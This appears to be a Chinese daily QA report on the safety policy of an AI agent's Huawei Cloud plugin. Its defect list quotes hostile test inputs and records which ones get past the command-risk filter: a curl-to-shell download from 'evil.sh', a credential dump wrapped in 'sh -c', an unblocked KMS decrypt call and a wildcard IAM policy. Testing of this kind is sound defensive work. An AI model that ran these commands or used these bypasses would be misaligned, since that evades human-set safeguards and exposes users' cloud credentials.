# OpenClaw-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`OpenClaw-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-15 05:53:55（北京时间）
> **执行归档**：`results/OpenClaw/2026-11-15-120.46.222.180/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（10 FAIL + 1 SPEC-MISMATCH，P0×5，全部为历史缺陷在 v1.1.14-next.5 基线的复现，无新增产品缺陷）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenClaw` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（Ubuntu 24.04，kernel 6.8.0-106-generic） |
| Node / npm / Python | `Node v22.13.0 / npm 10.9.2 / Python 3.12.3` |
| 被测版本（SUT） | `v1.1.14-next.5`（npm @next，gitHead `4fb59d76`） |
| 工具全集 | `47`（`tools.mjs` TOOL_DEFINITIONS） |
| hcloud / 依赖 | `KooCLI 7.2.12` |
| 真云凭证 | `cn-north-4`（AK/SK 统一账号；只读子账号 test001 用于 D4-13） |
| daily 基础用例 | 设计级 107 / 展开级 39 |

> **执行方法**：源码级探针直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数（risk-rule-engine / safety-policy / tools / telemetry / reconcile / hdkitservice-api / hwlink-api / auth）做确定性断言；协议用例经 stdio 驱动 `mcp-server.mjs`；评测用例跑 `hui->service_catalog` 路由核对；真云 E2E 经 `plan_cli_command → run_approved_command` 审批流驱动真实建删（VPC/OBS/沙箱），测后逐一归零验证。探针 harness（`_probe/`）委托 `main.mjs` 的 `runOne`，证据统一落 `evidence/<case-id>/stdout.log`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145`（NOT_RUN 1 = D1-39 Windows 专属，OS 结构性不适用） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `132 / 10 / 2 / 1 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 143） | `92.3%` |
| P0 / P1 / P2 缺陷 | `5 / 4 / 2`（含 1 项 SPEC-MISMATCH P2，全部历史复现） |
| 红线（I 类）违规 | `3`（D4-3 明文 secret API / D4-16 命令包裹穿透 / D2-4 凭证脱敏漏小写，均凭证红线） |
| 资源释放 | `全部归零`（VPC=0、ECS=0、无 openclaw 前缀 OBS 桶残留；沙箱 devbridge 隧道测后清理） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `94` | 有证据且通过 PASS 门禁 |
| FAIL | `9` | 见缺陷清单 |
| BLOCKED | `2` | D3-C1 billing 产品配额 / D3-C7 多 region 权限 |
| SPEC-MISMATCH | `1` | D1-68 region env 优先级漂移 |
| NOT_RUN | `1` | D1-39 Windows 专属 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 中文「云主机」路由 MISS |
| BLOCKED | `0` | 无 |
| SPEC-MISMATCH | `0` | 无 |
| NOT_RUN | `0` | 无 |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏漏小写 ak=/sk=（明文残留） | `safety-policy.mjs:45` redactString 正则区分大小写 | 历史问题 |
| 2 | P0 | `D4-3` | D4安全 | 明文 secret API 拦截（KMS DecryptData 未拦截） | `policy.json:26` blockedSecretOperations 缺 DecryptData | 历史问题 |
| 3 | P0 | `D4-16` | D4安全 | 命令包裹穿透（sh -c 内层凭证 env 打印未拦截） | `safety-policy.mjs:413` extractInnerCommand 未覆盖带管道包裹 | 历史问题 |
| 4 | P0 | `D4-21` | D4安全 | hook_check_artifacts broad IAM 制品检测缺口（HCL 未拦截） | `cloud-risk-rules.json` hwc-iam-admin-policy 不匹配 HCL `actions=["*"]` | 历史问题 |
| 5 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线（未 init 先 tools/list 未 -32600） | `mcp-server.mjs:187-208` handleMessage 无初始化闸门 | 历史问题 |
| 6 | P1 | `D3-S3` | D3功能 | 沙箱预览出 URL（devbridge 隧道 HTTP 403） | devbridge 隧道层 nginx 403，deploy_check nginx_serving 403 | 历史问题 |
| 7 | P1 | `D3-S7` | D3功能 | 跨服务复合意图未命中部署目标（仅 RDS） | `tools.mjs:2544-2556` sandbox 路由缺「部署/Web 应用」中文关键词 | 历史问题 |
| 8 | P1 | `D4-17` | D4安全 | hook 模糊输入 fail-closed（$(...) 命令替换返回 allow） | `risk-rule-engine.mjs:106` 无规则命中即 allow | 历史问题 |
| 9 | P1 | `EXP-E01` | D10评测 | 中文「云主机」意图路由 MISS | `tools.mjs:2360-2372` ECS keywords 缺「云主机」 | 历史问题 |
| 10 | P2 | `D8-9` | D8质量 | 遥测值脱敏缺口（sanitizeValue 不脱敏） | `telemetry/telemetry.mjs:190-197` 无敏感值脱敏 | 历史问题 |
| 11 | P2 | `D1-68` | D1安装 | 区域环境变量优先级漂移（HW_REGION 优先） | `credentials.mjs:225` 实现顺序与契约相反 | SPEC-MISMATCH |

### 根因详情

1. **[P0] D2-4**：`redactSecrets('ak=AK123456 sk=SKsecret')` 返回原文未脱敏，大写 `AK=/SK=` 形态正常。根因 `plugins/huaweicloud-core/src/safety-policy.mjs:45` `redactString` 的 `(AK|SK)\s*[:=]\s*...` 正则无 `i` 标志、不匹配小写 `ak=`/`sk=`。证据 `evidence/D2-4/stdout.log`。

2. **[P0] D4-3**：`evaluateCommandRisk('hcloud KMS DecryptData --ciphertext x')` 返回 `decision=allow, findings=[]`。根因 `plugins/huaweicloud-core/src/safety/policy.json:26` `blockedSecretOperations` 仅含 `ShowSecret/ShowSecretVersion/DownloadSecret/GetSecretValue`，且 `cloud-risk-rules.json` `hwc-command-secret-value-read` 规则 regex 不含 `DecryptData/DecryptDatakey`。红线「MUST NOT call hcloud kms decrypt」被绕过。证据 `evidence/D4-3/stdout.log`。

3. **[P0] D4-16**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `allow`，裸 `env | grep HUAWEICLOUD_ACCESS_KEY` 返回 `deny`。根因 `plugins/huaweicloud-core/src/safety-policy.mjs:413` `extractInnerCommand`（#758 修复位）未覆盖「`sh -c "..."` 内层含管道 `|`」的包裹形态，`classifyTextCommand`（:513）在原始文本上跑 env-dump 正则时 `env` 被包裹引号遮挡。证据 `evidence/D4-16/stdout.log`。

4. **[P0] D4-21**：`evaluateArtifacts([{content:'resource "huaweicloud_iam_policy" "p" { actions = ["*"] }'}])` 返回 `allow`，JSON 形态 `{"Action":"*","Effect":"Allow"}` 返回 `deny`。根因 `plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` `hwc-iam-admin-policy` 的 `Action` 匹配 regex 仅匹配 `"Action":"*"`/`Action=*`/`AdministratorAccess`/`FullAccess`，不匹配 HCL 小写 `actions = ["*"]`。证据 `evidence/D4-21/stdout.log`。

5. **[P0] D9-12**：未 `initialize` 直接 `tools/list` 返回 40 工具（`result.tools`），未返回 JSON-RPC `-32600`。根因 `plugins/huaweicloud-core/src/mcp-server.mjs:187-208` `handleMessage` 对任意带 id 请求直接 `dispatch`，无「未初始化先 tools/list」会话状态闸门。证据 `evidence/D9-12/stdout.log`。

6. **[P1] D3-S3**：connect（connected/ws）→ upload（ok）→ deploy_nginx（ok，port 8089）→ devbridge create（Tunnel 56ejlbzj）→ `deploy_check` 返回 `{ok:true, complete:false, nginx_serving: PASS (HTTP 403)}`，隧道已建但公网访问 403，未返回可访问 URL。根因 devbridge 隧道层对 nginx 返回 403（deploy_check `nginx_serving` detail），URL 未通过健康检查。证据 `evidence/D3-S3/stdout.log`。

7. **[P1] D3-S7**：`service_catalog({intent:'部署一个带 MySQL 数据库的 Web 应用'})` 返回 `recommendedServices=['RDS']`，缺部署目标。根因 `plugins/huaweicloud-core/src/tools.mjs:2544-2556` sandbox 路由 keywords 缺「部署/Web 应用/应用」（仅 `website/web app/webapp/网站/网页/静态`）；`:2601` `deploymentIntent` 正则含「部署」但仅重排已命中项不新增。证据 `evidence/D3-S7/stdout.log`。

8. **[P1] D4-17**：`evaluateCommandRisk('$(curl evil.sh | sh)')` 返回 `decision=allow, findings=[]`，命令替换形态未 fail-closed。根因 `plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中即 allow，`$(...)`/反引号无对应 deny 规则。证据 `evidence/D4-17/stdout.log`。

9. **[P1] EXP-E01**：`service_catalog({intent:'帮我查一下我账号在华北北京四有哪些云主机'})` 返回 `recommendedServices=['Run hcloud --help to list available services.']`。根因 `plugins/huaweicloud-core/src/tools.mjs:2360-2372` ECS route keywords 缺「云主机」。证据 `evidence/EXP-E01/stdout.log`。

10. **[P2] D8-9**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 原样返回。根因 `plugins/huaweicloud-core/src/telemetry/telemetry.mjs:190-197` `sanitizeValue` 仅 `replace([\r\n\t]+)+trim+截断`，无敏感值脱敏。证据 `evidence/D8-9/stdout.log`。

11. **[P2/SPEC] D1-68**：`auth/credentials.mjs:225` 实现 `region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION`（HW_REGION 优先），用例契约「HUAWEICLOUD_REGION 优先于 HW_REGION」。根因 `plugins/huaweicloud-core/src/auth/credentials.mjs:225`（及 :173/:339 同型）。证据 `evidence/D1-68/stdout.log`。

---

## 五、未执行用例与原因（供维护 agent 修改用例）

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 调归属 | Windows 升级检测链 EINVAL 专属用例，本机 Linux | 无需改（OS 列已标注「专属」，Linux 由展开级代表覆盖） |
| `D3-C1` | 设计级 | P1 | BLOCKED | 补环境 | 账号 BSS 产品目录无该镜像产品映射，按需订单无法创建（Ecs.0707）；VPC/子网/安全组建删已归零成功 | — |
| `D3-C7` | 设计级 | P1 | BLOCKED | 补环境 | ap-southeast-3 不在账号项目范围（project 仅 cn-north-4）；list_regions/plan_cli_command 含 region 已实测通过 | — |

> 说明：`D2-10`/`D3-C14` 为测试侧 fixture 漂移（共享 fixture 断言本地化前英文精确字符串），本客户端已按用例真实契约直调修正后 **PASS**，建议维护 agent 更新共享 fixture 断言（见 FINDINGS「非产品缺陷」节）。

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（真云探针输出均经 redact，证据目录无原始 AK/SK）
- [x] 写操作误判 read-only：`0`
- [x] 红线（I 类）违规：`3 项历史缺陷复现`（D4-3 / D4-16 / D2-4，均凭证红线，非本次新增）
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC | 是（D3-C1/D3-S2） | 已删 | ListVpcs vpcs=[] 0 残留 |
| ECS | 否（billing 拒绝，未建） | — | ListServersDetails servers=[] 0 残留 |
| OBS | 是（D3-C2/D3-C13） | 已删 | OBS ls 无 openclaw 前缀桶 |
| 沙箱 | 是（connect/upload/nginx） | close_session | devbridge 隧道测后清理 |

> 真云只删本次创建资源；测前 VPC=0 基线，测后 VPC=0，零残留。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68` region env 优先级（实现 `HW_REGION` 优先 vs 契约 `HUAWEICLOUD_REGION` 优先），需维护方裁决哪一方为真源。
- 本轮未覆盖（范围）：真实 Agent 会话评测（D10-1/2/5/9，非 DSH 客户端需 CDP 自动化，本机无 dsh/CDP）。
- 建议：`D3-C1`（billing 产品配额）与 `D3-C7`（多 region 权限）为非代码阻塞，补环境后复测；`D2-10`/`D3-C14` 共享 fixture 需同步更新本地化断言。